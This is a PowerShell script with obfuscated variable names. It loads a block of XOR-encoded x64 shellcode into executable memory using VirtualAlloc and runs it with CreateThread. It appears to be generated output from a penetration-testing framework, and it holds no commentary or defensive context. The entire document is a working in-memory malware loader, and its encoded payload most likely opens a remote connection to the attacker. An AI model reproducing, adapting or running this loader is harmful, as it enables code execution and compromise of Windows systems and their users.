$orsDNCVRXxnO = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$niLSGInZGRUmz = Add-Type -memberDefinition $orsDNCVRXxnO -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $JjPNnbnBy = 0x48,0x31,0xc9,0x48,0x81,0xe9,0xc0,0xff,0xff,0xff,0x48,0x8d,0x5,0xef,0xff,0xff,0xff,0x48,0xbb,0x2f,0xb3,0xc4,0xba,0xff,0xc6,0xc1,0x56,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xd3,0xfb,0x47,0x5e,0xf,0x2e,0xd,0x56,0x2f,0xb3,0x85,0xeb,0xbe,0x96,0x93,0x7,0x67,0x82,0x16,0xdf,0xb7,0x4d,0x93,0x36,0x79,0xfb,0x4f,0xe8,0xe7,0x8e,0x4a,0x4,0xf,0xfb,0x4f,0xc8,0xaf,0x8e,0xce,0xe1,0x65,0xf9,0x89,0x8b,0x36,0x8e,0xf0,0x96,0x83,0x8f,0xa5,0xc6,0xfd,0xea,0xe1,0x17,0xee,0x7a,0xc9,0xfb,0xfe,0x7,0x23,0xbb,0x7d,0xfb,0x4f,0xe8,0xdf,0x4d,0x83,0x6a,0x6e,0xe2,0x8c,0xbb,0x2f,0xa0,0x40,0x2e,0x37,0xb8,0xc6,0xb5,0x7a,0xb4,0xc1,0x56,0x2f,0x38,0x44,0x32,0xff,0xc6,0xc1,0x1e,0xaa,0x73,0xb0,0xdd,0xb7,0xc7,0x11,0x12,0xa4,0xf3,0xe4,0x31,0xb7,0xde,0x88,0x57,0xff,0xe3,0x27,0xec,0xb7,0x39,0x8,0x1b,0x1e,0x7a,0x85,0x31,0xcb,0x4e,0x89,0x57,0xf9,0xfb,0xf5,0x7a,0x53,0x87,0x0,0x9f,0x22,0xf2,0xc5,0x7b,0xc7,0x26,0xb4,0xa7,0x63,0xb0,0x88,0x9e,0xf7,0x83,0xf8,0x87,0x5a,0x6b,0x9c,0xfe,0x74,0x86,0xe5,0x1f,0x2e,0x63,0xa2,0xfb,0x74,0xca,0x89,0x12,0xa4,0xf3,0xd8,0xf3,0xfe,0x16,0x80,0xdd,0x2b,0x3b,0x8c,0xbb,0x2f,0x87,0x99,0x17,0x77,0xed,0x9d,0xe0,0xbe,0x9e,0x80,0xf,0x6e,0xe9,0x8c,0x39,0x13,0xe6,0x80,0x4,0xd0,0x53,0x9c,0xfb,0xa6,0x9c,0x89,0xdd,0x3d,0x5a,0x8f,0x45,0x0,0x39,0x9c,0x1f,0x91,0xc4,0xb7,0x88,0xa0,0xf5,0xf3,0x56,0x2f,0xf2,0x92,0xf3,0x76,0x20,0x89,0xd7,0xc3,0x13,0xc5,0xba,0xff,0x8f,0x48,0xb3,0x66,0xf,0xc6,0xba,0xdc,0xef,0x1,0xfe,0x2e,0xab,0x85,0xee,0xb6,0x4f,0x25,0x1a,0xa6,0x42,0x85,0x0,0xb3,0xb1,0xe7,0x51,0xd0,0x66,0x88,0x33,0x15,0xae,0xc0,0x57,0x2f,0xb3,0x9d,0xfb,0x45,0xef,0x41,0x3d,0x2f,0x4c,0x11,0xd0,0xf5,0x87,0x9f,0x6,0x7f,0xfe,0xf5,0x73,0xb2,0xf7,0x1,0x1e,0xd0,0x73,0x8c,0x33,0x3d,0x8e,0x3e,0x96,0x67,0x3a,0x5,0xfb,0x45,0x2c,0xce,0x89,0xcf,0x4c,0x11,0xf2,0x76,0x1,0xab,0x46,0x6e,0xeb,0x88,0x33,0x1d,0x8e,0x48,0xaf,0x6e,0x9,0x5d,0x1f,0x8b,0xa7,0x3e,0x83,0xaa,0x73,0xb0,0xb0,0xb6,0x39,0xf,0x23,0xca,0x5b,0x57,0xba,0xff,0xc6,0x89,0xd5,0xc3,0xa3,0x8c,0x33,0x1d,0x8b,0xf0,0x9f,0x45,0xb7,0x85,0xe2,0xb7,0x4f,0x38,0x17,0x95,0xb1,0x1d,0x72,0xa0,0x39,0x14,0xd5,0xd7,0xb3,0xba,0xef,0xb7,0x45,0x5,0x76,0x71,0x3a,0x32,0xd0,0xbf,0x87,0x98,0x3e,0x2f,0xa3,0xc4,0xba,0xbe,0x9e,0x89,0xdf,0xdd,0xfb,0xf5,0x73,0xbe,0x7c,0x99,0xf2,0x7c,0x56,0x3b,0x6f,0xb7,0x4f,0x2,0x1f,0xa6,0x74,0x89,0x8b,0x36,0x8f,0x48,0xa6,0x67,0x3a,0x1e,0xf2,0x76,0x3f,0x80,0xec,0x2d,0x6a,0xc,0xe5,0x0,0x13,0x42,0xae,0x2f,0xce,0xec,0xe2,0xbe,0x91,0x98,0x3e,0x2f,0xf3,0xc4,0xba,0xbe,0x9e,0xab,0x56,0x75,0xf2,0x7e,0xb1,0xd0,0xc9,0xf1,0xa9,0xfa,0xe4,0x9d,0xfb,0x45,0xb3,0xaf,0x1b,0x4e,0x4c,0x11,0xf3,0x0,0x8,0x28,0x6a,0xd0,0x4c,0x3b,0xf2,0xfe,0x5,0x89,0x7f,0xe9,0xfb,0x41,0x4c,0x8a,0x72,0x80,0xa9,0xc8,0xeb,0xae,0xba,0xa6,0x8f,0x6,0x94,0xdf,0x6,0x66,0xec,0x0,0x13,0xc1,0x56


$LBbTiLiWBjzZ = $niLSGInZGRUmz::VirtualAlloc(0,[Math]::Max($JjPNnbnBy.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($JjPNnbnBy,0,$LBbTiLiWBjzZ,$JjPNnbnBy.Length)

$niLSGInZGRUmz::CreateThread(0,0,$LBbTiLiWBjzZ,0,0,0)